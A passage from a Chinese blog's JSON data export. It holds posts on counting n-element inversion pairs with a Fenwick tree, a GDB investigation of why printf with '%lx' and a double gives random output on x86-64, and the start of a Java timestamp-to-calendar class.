result[n]</li>\n<li>首先看看如何求二元逆序对<ul>\n<li>从左到右扫描序列，对于序列中位置为<code>i</code>的值<code>x</code>，flag[x]+=1</li>\n<li>然后此时，以该x结尾的逆序对的数量就是$\\sum_{j=x+1}^{MAX}flag[j]$，将这个数量记录在result[i]</li>\n<li>那么result的数组的和就是逆序对的数量</li>\n<li>同样的，在刚才flag[x]+=1的步骤，可以输出后面的数与x组成的序对来输出具体的逆序对</li>\n</ul>\n</li>\n<li>三元组的，我们已经用上面的方法求出二元的result数组(此处将其记为result_2数组)，此时设另外的两个数组int flag_3[MAX+1], int result_3[n];<ul>\n<li>同样扫描序列，对于位置为<code>i</code>的数<code>x</code>，取出result_2[i]的值，也就是以该x结尾的二元组逆序对的数量m，然后flag_3[x]+=m。此时flag_3[x]记录了截止目前，以x结尾的二元组逆序对的数量</li>\n<li>求$\\sum_{j=x+1}^{MAX}flag_3[j]$，得到以x结尾的三元组逆序对的数量，记录在result_3[i]中</li>\n<li>到最后，result_3就是结果</li>\n</ul>\n</li>\n<li>更多元组的也如此思路</li>\n<li>这是利用数组记录了当前已经有的数，然后新加入的数如果不是该数组中当前index最大的，那么意味着其比之前加入的一些数小，这就形成了逆序对</li>\n<li>对于n元逆序对，同理，数组记录了当前已有的数<code>x</code>作为<code>最后一个元素是x的n-1元逆序对</code>的逆序对的数量，然后如果我们往该数组加入一个数，然后这个数不是index最大的，那么其比之前已经加入的一些数小，从而与<code>比他大的数代表的n-1元逆序对</code>形成了更长的逆序对</li>\n<li>然后，既然这其中，对数组求和很重要，我们就可以利用树状数组优化这个往flag[x]中增加数值然后求和计算出对应result[i]的过程（原始序对中第<code>i</code>位的值是<code>x</code>）</li>\n</ul>\n<blockquote>\n<p>3p另一种思路：针对三元逆序对，还有一种简单的解法，先把数据按顺序插入，用树形数组记录此时比这个数大的数的数目x，再把数据倒着插入，用另一个树形数组记录此时比这个数小的数的数目y，x*y=以这个数为中心的三元逆数对数目，把各个数计算累计起来即可（来自17级大佬Potatso）</p>\n</blockquote>\n","slug":"n元逆序对数量求解","categories":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://h-zex.github.io/tags/算法/"},{"name":"树状数组","slug":"树状数组","permalink":"https://h-zex.github.io/tags/树状数组/"}]},{"title":"printf的一个异常现象引发的对x86-64体系下可变参数传参的探究","date":"2018-01-19T03:31:36.000Z","path":"2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/","text":"测试环境 12345clang version 3.8.1-24 (tags/RELEASE_381/final)Target: x86_64-pc-linux-gnuThread model: posixLinux version 4.9.0-deepin13-amd64 (yangbo@deepin.com) (gcc version 6.3.0 20170321 (Debian 6.3.0-11) ) #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) 奇异现象复现 代码 1234567#include &lt;stdio.h&gt;int main()&#123; double a = 6.0; printf(\"%lx\\n\" , a);&#125; 执行结果 这段代码用的运行结果是随机的，无规律的，这是非常奇怪的 先说原因 printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 a 因为是double类型，所以放在xmm0寄存器。 分析 先看glibc-2.26中stdio-common/printf.c的源码 123456789101112int__printf (const char *format, ...)&#123; va_list arg; int done; va_start (arg, format); done = vfprintf (stdout, format, arg); va_end (arg); return done;&#125; 可以看到，使用的是stdarg的机制实现可变参数传参。 如果可变参数完全使用栈帧传递，那么结果不可能是随机的。那么只可能是使用寄存器传参 复习一下CSAPP第三章 可以看到，浮点参数的传参使用的是SIMD寄存器，而整形使用的是通用目的寄存器 那么猜测，这应该是问题所在。printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 a 因为是double类型，所以放在xmm0寄存器。 GDB调试 使用 clang -S d.c &amp;&amp; clang d.s -g命令编译上面那段问题代码。这样我们就可以在gdb里针对汇编指令设置断点 main函数部分汇编代码 12345678subq $16, %rspmovabsq $.L.str, %rdi # .L.str就是&quot;%lx\\n&quot;movsd .LCPI0_0, %xmm0 # 字面量的浮点放在内存，.LCPI0_0引用的就是 double 类型的 6.0movsd %xmm0, -8(%rbp)movsd -8(%rbp), %xmm0 movb $1, %alcallq printf 可以看到，double a 确实放在了xmm0, 用GDB在 callq printf 处设置断点(注意，运行到断点处，callq printf指令还没有执行)，检查用于传参的前四个通用目的寄存器 （红框内是前四个传参的通用目的寄存器） 执行gdb 的next指令 ，运行callq printf这条指令，检查输出 可以看到，与rsi寄存器的内容一样。可以初步确认，因为格式字符串是”%lx”，所以printf在通用目的寄存器读取可变参数 手动修改汇编代码，在callq printf之前加上一条movq $16, %rsi（注意，此处是十进制，而printf使用的格式字符串是”%lx”，所以程序输出的是十六进制） 1234567movabsq $.L.str, %rdimovsd .LCPI0_0, %xmm0 # xmm0 = mem[0],zeromovsd %xmm0, -8(%rbp)movsd -8(%rbp), %xmm0 # xmm0 = mem[0],zeromovb $1, %almovq $16, %rsi # 这一条就是加上去的callq printf 运行，结果是 符合预期，与rsi寄存器的东西一样 分析结果得到证实 探究过程出现的一些问题 在不合时宜的时刻检查寄存器的值 执行完callq printf后才检查xmm0、xmm1的内容，企图找到double a 执行完callq printf后才检查rdi、rsi的值。 因为printf函数会使用这些寄存器，所以这样检查必然是不行的 关于vc++的一些补充 Visual Studio 2015的参数传递文档 ​ 注意：这里的b不是在xmm0，而是在xmm1，d也是如此 Visual Studio 2015 的 Varargs文档 如果参数是通过 vararg（例如省略号参数）传递的，则基本上会应用正常的参数传递过程，包括溢出第五个及后续参数。 此外，被调用方的责任是转储采用其地址的参数。仅处理浮点值时，如果被调用方要使用整数寄存器中的值，整数寄存器和浮点寄存器才会同时包含浮点值 if parameters are passed via varargs (for example, ellipsis arguments), then essentially the normal parameter passing applies including spilling the fifth and subsequent arguments. It is again the callee’s responsibility to dump arguments that have their address taken. For floating-point values only, both the integer and the floating-point register will contain the float value in case the callee expects the value in the integer registers. 按照我的理解，加粗部分应该是说，如果实参里有integer也有float-point，那么我们在整形寄存器也可以读取到对应序号的浮点寄存器的值，比如test(3, 2.0, 1)，那么2.0既存在于RDX，也存在于XMM1， 1既存在于R8，也存在于xmm2。这样，我们使用stdarg的va_arg(ap, long long)读取第二个参数2.0时，就不会出错。如果是gcc，就会出错，因为gcc并不会把浮点放在整形寄存器。 这应该是微软为了兼容以前的老代码，以前可变参都是放在栈上，所以改变va_arg的第二个实参type也不会读错，只会形成强制类型转换。（由于手头没有vc++的编译器，只能借助跟师兄的远程合作来探究，所以这里只有部分猜测被证实，读者可以自己测试一下是否在对应序号的整形寄存器和浮点寄存器存在相同的内容）","raw":"---\ntitle: printf的一个异常现象引发的对x86-64体系下可变参数传参的探究\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-01-19 11:31:36\ntags:\n- printf\n- 操作系统\n- 底层\n- CSAPP\ndescription: x86-64体系下的传参方式使得可变参数的传递出现了一些特别的情况\ncategories:\n- CSAPP\n---\n\n### 测试环境\n\n   ```\nclang version 3.8.1-24 (tags/RELEASE_381/final)\nTarget: x86_64-pc-linux-gnu\nThread model: posix\n\nLinux version 4.9.0-deepin13-amd64 (yangbo@deepin.com) (gcc version 6.3.0 20170321 (Debian 6.3.0-11) ) #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19)\n   ```\n\n### 奇异现象复现\n\n- 代码\n\n   ```c\n\n    #include <stdio.h>\n    int main()\n    {\n        double a = 6.0;\n        printf(\"%lx\\n\"\t, a);\n    }\n   ```\n\n- 执行结果\n\n  {% asset_img p6.png %}\n\n- 这段代码用的运行结果是随机的，无规律的，这是非常奇怪的\n\n### 先说原因\n\n- printf因为使用的格式化字符串是\"%lx\"所以从通用目的寄存器读取可变参数，但是 `a` 因为是double类型，所以放在xmm0寄存器。\n\n### 分析\n\n- 先看glibc-2.26中`stdio-common/printf.c`的源码\n\n   ```c\n   int\n   __printf (const char *format, ...)\n   {\n     va_list arg;\n     int done;\n\n     va_start (arg, format);\n     done = vfprintf (stdout, format, arg);\n     va_end (arg);\n\n     return done;\n   }\n   ```\n\n- 可以看到，使用的是stdarg的机制实现可变参数传参。\n\n- 如果可变参数完全使用栈帧传递，那么结果不可能是随机的。那么只可能是使用寄存器传参\n\n- 复习一下CSAPP第三章\n\n   {% asset_img p1.png %}\n\n   {% asset_img p2.png %}\n\n- 可以看到，浮点参数的传参使用的是SIMD寄存器，而整形使用的是通用目的寄存器\n- 那么猜测，这应该是问题所在。printf因为使用的格式化字符串是\"%lx\"所以从通用目的寄存器读取可变参数，但是 `a` 因为是double类型，所以放在xmm0寄存器。\n\n### GDB调试\n\n- 使用 `clang -S d.c &&  clang d.s -g`命令编译上面那段问题代码。这样我们就可以在gdb里针对汇编指令设置断点\n\n- main函数部分汇编代码\n\n  ```assembly\n  subq\t$16, %rsp\n  movabsq\t$.L.str, %rdi\t\t# .L.str就是\"%lx\\n\"\n  movsd\t.LCPI0_0, %xmm0    \t\n  # 字面量的浮点放在内存，.LCPI0_0引用的就是 double 类型的 6.0\n  movsd\t%xmm0, -8(%rbp)\n  movsd\t-8(%rbp), %xmm0        \n  movb\t$1, %al\n  callq\tprintf\n  ```\n\n- 可以看到，double a 确实放在了xmm0,\n\n- 用GDB在 ` callq printf` 处设置断点(注意，运行到断点处，callq printf指令还没有执行)，检查用于传参的前四个通用目的寄存器\n\n  {% asset_img p4.png %}\n\n  （红框内是前四个传参的通用目的寄存器）\n\n- 执行gdb 的`next`指令 ，运行`callq printf`这条指令，检查输出\n\n  {% asset_img p3.png %}\n\n- 可以看到，与`rsi`寄存器的内容一样。可以初步确认，因为格式字符串是\"%lx\"，所以printf在通用目的寄存器读取可变参数\n\n- 手动修改汇编代码，在callq printf之前加上一条`movq $16, %rsi`（注意，此处是十进制，而printf使用的格式字符串是\"%lx\"，所以程序输出的是十六进制）\n\n  ```assembly\n  movabsq\t$.L.str, %rdi\n  movsd\t.LCPI0_0, %xmm0         # xmm0 = mem[0],zero\n  movsd\t%xmm0, -8(%rbp)\n  movsd\t-8(%rbp), %xmm0         # xmm0 = mem[0],zero\n  movb\t$1, %al\n  movq    $16, %rsi \t\t\t\t# 这一条就是加上去的\n  callq\tprintf\n  ```\n\n- 运行，结果是\n\n  {% asset_img p5.png %}\n\n- 符合预期，与rsi寄存器的东西一样\n\n- 分析结果得到证实\n\n### 探究过程出现的一些问题\n\n- 在不合时宜的时刻检查寄存器的值\n  - 执行完`callq printf`后才检查xmm0、xmm1的内容，企图找到double a\n  - 执行完`callq printf`后才检查rdi、rsi的值。\n- 因为printf函数会使用这些寄存器，所以这样检查必然是不行的\n\n### 关于vc++的一些补充\n\n- [Visual Studio 2015的参数传递文档](https://msdn.microsoft.com/zh-cn/library/zthk2dkh.aspx)\n\n  {% asset_img p8.png %}\n\n  {% asset_img p7.png %}\n\n  ​\t**注意：这里的b不是在xmm0，而是在xmm1，d也是如此**\n\n\n- [Visual Studio 2015 的 Varargs文档 ](https://msdn.microsoft.com//library/dd2wa36c.aspx)\n\n  >  如果参数是通过 vararg（例如省略号参数）传递的，则基本上会应用正常的参数传递过程，包括溢出第五个及后续参数。 此外，被调用方的责任是转储采用其地址的参数。**仅处理浮点值时，如果被调用方要使用整数寄存器中的值，整数寄存器和浮点寄存器才会同时包含浮点值**\n  >\n  >  if parameters are passed via varargs (for example, ellipsis arguments), then essentially the normal parameter passing applies including spilling the fifth and subsequent arguments. It is again the callee's responsibility to dump arguments that have their address taken. **For floating-point values only, both the integer and the floating-point register will contain the float value in case the callee expects the value in the integer registers.**\n\n- 按照我的理解，加粗部分应该是说，如果实参里有integer也有float-point，那么我们在整形寄存器也可以读取到对应序号的浮点寄存器的值，**比如test(3, 2.0, 1)，那么2.0既存在于RDX，也存在于XMM1， 1既存在于R8，也存在于xmm2。**这样，我们使用stdarg的va_arg(ap, long long)读取第二个参数2.0时，就不会出错。如果是gcc，就会出错，因为gcc并不会把浮点放在整形寄存器。\n\n- 这应该是微软为了兼容以前的老代码，以前可变参都是放在栈上，所以改变va_arg的第二个实参type也不会读错，只会形成强制类型转换。（由于手头没有vc++的编译器，只能借助跟师兄的远程合作来探究，所以这里只有部分猜测被证实，读者可以自己测试一下是否在对应序号的整形寄存器和浮点寄存器存在相同的内容）","content":"<h3 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h3>   <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clang version 3.8.1-24 (tags/RELEASE_381/final)</span><br><span class=\"line\">Target: x86_64-pc-linux-gnu</span><br><span class=\"line\">Thread model: posix</span><br><span class=\"line\"></span><br><span class=\"line\">Linux version 4.9.0-deepin13-amd64 (yangbo@deepin.com) (gcc version 6.3.0 20170321 (Debian 6.3.0-11) ) #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19)</span><br></pre></td></tr></table></figure>\n<h3 id=\"奇异现象复现\"><a href=\"#奇异现象复现\" class=\"headerlink\" title=\"奇异现象复现\"></a>奇异现象复现</h3><ul>\n<li><p>代码</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">double</span> a = <span class=\"number\">6.0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%lx\\n\"</span>\t, a);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>执行结果</p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p6.png\">\n</li>\n<li><p>这段代码用的运行结果是随机的，无规律的，这是非常奇怪的</p>\n</li>\n</ul>\n<h3 id=\"先说原因\"><a href=\"#先说原因\" class=\"headerlink\" title=\"先说原因\"></a>先说原因</h3><ul>\n<li>printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 <code>a</code> 因为是double类型，所以放在xmm0寄存器。</li>\n</ul>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><ul>\n<li><p>先看glibc-2.26中<code>stdio-common/printf.c</code>的源码</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span></span><br><span class=\"line\">__printf (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *format, ...)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  va_list arg;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> done;</span><br><span class=\"line\"></span><br><span class=\"line\">  va_start (arg, format);</span><br><span class=\"line\">  done = <span class=\"built_in\">vfprintf</span> (<span class=\"built_in\">stdout</span>, format, arg);</span><br><span class=\"line\">  va_end (arg);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> done;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可以看到，使用的是stdarg的机制实现可变参数传参。</p>\n</li>\n<li><p>如果可变参数完全使用栈帧传递，那么结果不可能是随机的。那么只可能是使用寄存器传参</p>\n</li>\n<li><p>复习一下CSAPP第三章</p>\n <img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p1.png\">\n <img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p2.png\">\n</li>\n<li><p>可以看到，浮点参数的传参使用的是SIMD寄存器，而整形使用的是通用目的寄存器</p>\n</li>\n<li>那么猜测，这应该是问题所在。printf因为使用的格式化字符串是”%lx”所以从通用目的寄存器读取可变参数，但是 <code>a</code> 因为是double类型，所以放在xmm0寄存器。</li>\n</ul>\n<h3 id=\"GDB调试\"><a href=\"#GDB调试\" class=\"headerlink\" title=\"GDB调试\"></a>GDB调试</h3><ul>\n<li><p>使用 <code>clang -S d.c &amp;&amp;  clang d.s -g</code>命令编译上面那段问题代码。这样我们就可以在gdb里针对汇编指令设置断点</p>\n</li>\n<li><p>main函数部分汇编代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">subq\t$16, %rsp</span><br><span class=\"line\">movabsq\t$.L.str, %rdi\t\t# .L.str就是&quot;%lx\\n&quot;</span><br><span class=\"line\">movsd\t.LCPI0_0, %xmm0    \t</span><br><span class=\"line\"># 字面量的浮点放在内存，.LCPI0_0引用的就是 double 类型的 6.0</span><br><span class=\"line\">movsd\t%xmm0, -8(%rbp)</span><br><span class=\"line\">movsd\t-8(%rbp), %xmm0        </span><br><span class=\"line\">movb\t$1, %al</span><br><span class=\"line\">callq\tprintf</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可以看到，double a 确实放在了xmm0,</p>\n</li>\n<li><p>用GDB在 <code>callq printf</code> 处设置断点(注意，运行到断点处，callq printf指令还没有执行)，检查用于传参的前四个通用目的寄存器</p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p4.png\">\n<p>（红框内是前四个传参的通用目的寄存器）</p>\n</li>\n<li><p>执行gdb 的<code>next</code>指令 ，运行<code>callq printf</code>这条指令，检查输出</p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p3.png\">\n</li>\n<li><p>可以看到，与<code>rsi</code>寄存器的内容一样。可以初步确认，因为格式字符串是”%lx”，所以printf在通用目的寄存器读取可变参数</p>\n</li>\n<li><p>手动修改汇编代码，在callq printf之前加上一条<code>movq $16, %rsi</code>（注意，此处是十进制，而printf使用的格式字符串是”%lx”，所以程序输出的是十六进制）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movabsq\t$.L.str, %rdi</span><br><span class=\"line\">movsd\t.LCPI0_0, %xmm0         # xmm0 = mem[0],zero</span><br><span class=\"line\">movsd\t%xmm0, -8(%rbp)</span><br><span class=\"line\">movsd\t-8(%rbp), %xmm0         # xmm0 = mem[0],zero</span><br><span class=\"line\">movb\t$1, %al</span><br><span class=\"line\">movq    $16, %rsi \t\t\t\t# 这一条就是加上去的</span><br><span class=\"line\">callq\tprintf</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>运行，结果是</p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p5.png\">\n</li>\n<li><p>符合预期，与rsi寄存器的东西一样</p>\n</li>\n<li><p>分析结果得到证实</p>\n</li>\n</ul>\n<h3 id=\"探究过程出现的一些问题\"><a href=\"#探究过程出现的一些问题\" class=\"headerlink\" title=\"探究过程出现的一些问题\"></a>探究过程出现的一些问题</h3><ul>\n<li>在不合时宜的时刻检查寄存器的值<ul>\n<li>执行完<code>callq printf</code>后才检查xmm0、xmm1的内容，企图找到double a</li>\n<li>执行完<code>callq printf</code>后才检查rdi、rsi的值。</li>\n</ul>\n</li>\n<li>因为printf函数会使用这些寄存器，所以这样检查必然是不行的</li>\n</ul>\n<h3 id=\"关于vc-的一些补充\"><a href=\"#关于vc-的一些补充\" class=\"headerlink\" title=\"关于vc++的一些补充\"></a>关于vc++的一些补充</h3><ul>\n<li><p><a href=\"https://msdn.microsoft.com/zh-cn/library/zthk2dkh.aspx\" target=\"_blank\" rel=\"noopener\">Visual Studio 2015的参数传递文档</a></p>\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p8.png\">\n<img src=\"/2018/01/19/printf的一个异常现象引发的对x86-64体系下可变参数传参的探究/p7.png\">\n<p>​    <strong>注意：这里的b不是在xmm0，而是在xmm1，d也是如此</strong></p>\n</li>\n</ul>\n<ul>\n<li><p><a href=\"https://msdn.microsoft.com//library/dd2wa36c.aspx\" target=\"_blank\" rel=\"noopener\">Visual Studio 2015 的 Varargs文档 </a></p>\n<blockquote>\n<p> 如果参数是通过 vararg（例如省略号参数）传递的，则基本上会应用正常的参数传递过程，包括溢出第五个及后续参数。 此外，被调用方的责任是转储采用其地址的参数。<strong>仅处理浮点值时，如果被调用方要使用整数寄存器中的值，整数寄存器和浮点寄存器才会同时包含浮点值</strong></p>\n<p> if parameters are passed via varargs (for example, ellipsis arguments), then essentially the normal parameter passing applies including spilling the fifth and subsequent arguments. It is again the callee’s responsibility to dump arguments that have their address taken. <strong>For floating-point values only, both the integer and the floating-point register will contain the float value in case the callee expects the value in the integer registers.</strong></p>\n</blockquote>\n</li>\n<li><p>按照我的理解，加粗部分应该是说，如果实参里有integer也有float-point，那么我们在整形寄存器也可以读取到对应序号的浮点寄存器的值，<strong>比如test(3, 2.0, 1)，那么2.0既存在于RDX，也存在于XMM1， 1既存在于R8，也存在于xmm2。</strong>这样，我们使用stdarg的va_arg(ap, long long)读取第二个参数2.0时，就不会出错。如果是gcc，就会出错，因为gcc并不会把浮点放在整形寄存器。</p>\n</li>\n<li><p>这应该是微软为了兼容以前的老代码，以前可变参都是放在栈上，所以改变va_arg的第二个实参type也不会读错，只会形成强制类型转换。（由于手头没有vc++的编译器，只能借助跟师兄的远程合作来探究，所以这里只有部分猜测被证实，读者可以自己测试一下是否在对应序号的整形寄存器和浮点寄存器存在相同的内容）</p>\n</li>\n</ul>\n","slug":"printf的一个异常现象引发的对x86-64体系下可变参数传参的探究","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"printf","slug":"printf","permalink":"https://h-zex.github.io/tags/printf/"},{"name":"操作系统","slug":"操作系统","permalink":"https://h-zex.github.io/tags/操作系统/"},{"name":"底层","slug":"底层","permalink":"https://h-zex.github.io/tags/底层/"},{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/tags/CSAPP/"}]},{"title":"从时间戳（毫秒）计算日历","date":"2017-10-02T08:58:15.000Z","path":"2017/10/02/从时间戳（毫秒）计算日历/","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116class MyDate &#123; private int year; private int month; private int day; private int hour; private int minute; private int second; private final long timePerSecond = 1000; private final long timePerMinute = 1000*60; private final long timePerHour = 3600*1000; private final long timePerDay = 24*3600*1000; private final long timePerPingNian = 365*timePerDay; private final long timePerLeapYear = 366*timePerDay; private final long timeOf1970And1971 = timePerPingNian+timePerPingNian; private final long timePer4Year = (long)(365.25*4*timePerDay); private final long timeEvery400Year = timePer4Year*100 - 3*timePerDay; private final long timeOf1970To2000 = timePer4Year*7+timeOf1970And1971; private final int[] daysPerMonth = &#123;31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31&#125;; private boolean setMinuteAndSecond(long milliTime) &#123; assert milliTime&lt;timePerDay; if(milliTime&gt;=timePerDay) return false; hour = (int)(milliTime/timePerHour); long t = milliTime%timePerHour; minute = (int)(t/timePerMinute); t = t%timePerMinute; second = (int)(t/timePerSecond); return true; &#125; private boolean setMonthAndDay(long milliTime, boolean isLeapYear) &#123; //this func should handle the case where milliTime == 0; //this func get the milliseconds within 1 year; assert milliTime&lt;=timePerLeapYear &amp;&amp; isLeapYear || milliTime&lt;=timePerPingNian &amp;&amp; !isLeapYear; if(milliTime&gt;timePerLeapYear &amp;&amp; isLeapYear || milliTime&gt;timePerPingNian &amp;&amp; !isLeapYear) &#123; return false; &#125; daysPerMonth[1] = isLeapYear ? 29 : 28; //set the days of February; int cnt = -1; do&#123; milliTime -= daysPerMonth[++cnt]*timePerDay; &#125;while (milliTime&gt;=0); month = cnt+1; //for that the cnt begin from 0, but month begin from 1; long timeOfLastMonth = daysPerMonth[cnt]*timePerDay+milliTime; day = (int)(timeOfLastMonth/timePerDay)+1; setMinuteAndSecond(timeOfLastMonth % timePerDay); return true; &#125; private boolean setDataFile(long milliTime) &#123; if(milliTime&lt;0) return false; boolean is1970Or1971 = milliTime&lt;timeOf1970And1971 ? true : false; boolean is20Century = milliTime&lt;timeOf1970To2000 ? true: false; //if equal is 2000 1 1 0:0:0 if(is1970Or1971) &#123; year = milliTime&gt;=timePerPingNian ? 1971 : 1970; setMonthAndDay(year==1971 ? milliTime-timePerPingNian : milliTime, false); return true; &#125; if(is20Century) &#123; long t = (milliTime-timeOf1970And1971)/timePer4Year; long t1 = milliTime-timeOf1970And1971-t*timePer4Year; long t2 = t1-timePerLeapYear; boolean isLeapYear = t2&lt;0; long t3 = isLeapYear ? 0 : t2/timePerPingNian+1; year = (int)(1972+t*4+t3); long l = isLeapYear ? t1 : (t1-t3*timePerPingNian-timePerDay); setMonthAndDay(l, isLeapYear); return true; &#125; long p = milliTime-timeOf1970To2000; long t1 = p/timeEvery400Year; long p1 = p-t1*timeEvery400Year; long t2 = p1/timePer4Year; long tN = t2/25; //in every 400 years, other year such as xy00(y!=0) is not leap year; long p2 = p1-t2*timePer4Year; p2 += tN*timePerDay; long t3 = p2-timePerLeapYear; boolean isLeapYear = t3&lt;0; long t4 = isLeapYear ? 0 : t3/timePerPingNian+1; year = (int)(2000+t1*400+t2*4+t4); long lt = isLeapYear ? p2 : (p2-t4*timePerPingNian-timePerDay); setMonthAndDay(lt, isLeapYear); return true; &#125;&#125; 思路设置时分秒（函数setMinuteAndSecond） 函数的输入是 小于 每天毫秒数 的一个整数 因为是从0:0:0开始计时，所以很好算 直接除以每小时毫秒数，结果就是 要求的小时数 然后把取模每小时毫秒数的结果除以每分钟毫秒数，算出来的结果就是分钟数 以此类推，算出秒数 设置月和日（函数setMonthAndDay） 函数的输入为 小于 每年毫秒数 一个整数 依次减去每个月的毫秒数，当减去某个月后，得到负数，说明月份就是这个月。注意，如果减去后得到0，则是下个月的第一毫秒，因为毫秒数是相对1970.1.1.0:0:0计算的。举个例子，毫秒数==一个平年的毫秒数，那么加上1970.1.1.0:0:0后，就变成1971.1.1.0:0:0，而不是1970.12.31.23:59:59 通过上面那个流程，得到属于一个月内的毫秒数（注意，比如说某个月的毫秒数是K，那么0~(K-1)都是属于这个月，但是K不是），然后除以每天的毫秒数，得到 P 。同样，如果整除，说明日期数是 P+1，如果不整除，那也是 P+1（注意，日期是从1开始，而不是从0开始） 设置年份（在函数setDataFile中） 对1970/1971特殊处理，直接判断是否毫秒数是否 $\\geq$ 一个平年的毫秒数，如果是，那么就是1971。注意，等于也是，原因如上所述。然后调用setMonthAndDay函数，设置日月 对1972.1.1.0:0:0到2000.1.1.0:0:0 特殊处理。先减去1970和1971的总的毫秒数，得到的结果除以每4年的毫秒数，得到H。同样，无论是否整除，年份数是在$[4H+1972, 4H+1972+3]$，整除就是$4H+1972$这一年的第一毫秒（0时0分0秒）。因为1970.1.1.0:0:0加上1970和1971总的毫秒数已经是1972.1.1.0:0:0了，再加上整数年$4H$就是(1972+4H).1.1.0:0:0了。 然后减去一个闰年的毫秒数，因为从1972年算起，每四年的第一年都是闰年，如果结果是负数，说明是闰年（同样的，如果是0，那么并不是闰年，而是闰年下一年的第一毫秒）。否则，把得到结果除以每个平年的毫秒数得到 P ，就是从闰年的下一年 开始的第 P 年，所以，年份就是$1972+4H+1+P$ 然后，因为当年份数是100的倍数时，只有当年份可以被400整除，才是闰年。而2000年正好就是每400年里的第一年，所以要先计算，毫秒数里总的有多少个400年，如果有 $t$ 个，那么年份数就是$[2000+400t, 2000+400t+399]$ 接下来就计算总的毫秒数减去1970到2000的毫秒数，再减去总共多少个400年的毫秒数，剩下的毫秒数里，算算有多少个4年，因为每4年是闰年。如果算出来的结果是$d$，那么年份数就是$[2000+400t+4d,2000+400t+4d+3]$ 接下来判断剩下的毫秒数是否小于一个闰年的毫秒数，如果是，那么就是闰年，年份数是$2000+400t+4d$。如果不是，就减去一个闰年的毫秒数，然后算一算剩下的有多少个平年的毫秒数，假设算出来的结果是$b$，那么年份数就是$2000+400t+4d+b+1$ 接下来调用setMonthAndDay函数设置月份日期","raw":"---\ntitle: 从时间戳（毫秒）计算日历\ntoc: \ncomments: true\nmathjax: true\ndate: 2017-10-02 16:58:15\ntags:\n- 时间戳\n- 日历\n- 算法\ndescription:\n- 从时间戳（毫秒）计算日历\ncategories:\n- 算法\n---\n\n```java\nclass MyDate {\n    private int year;\n    private int month;\n    private int day;\n    private int hour;\n    private int minute;\n    private int second;\n\n    private final long timePerSecond = 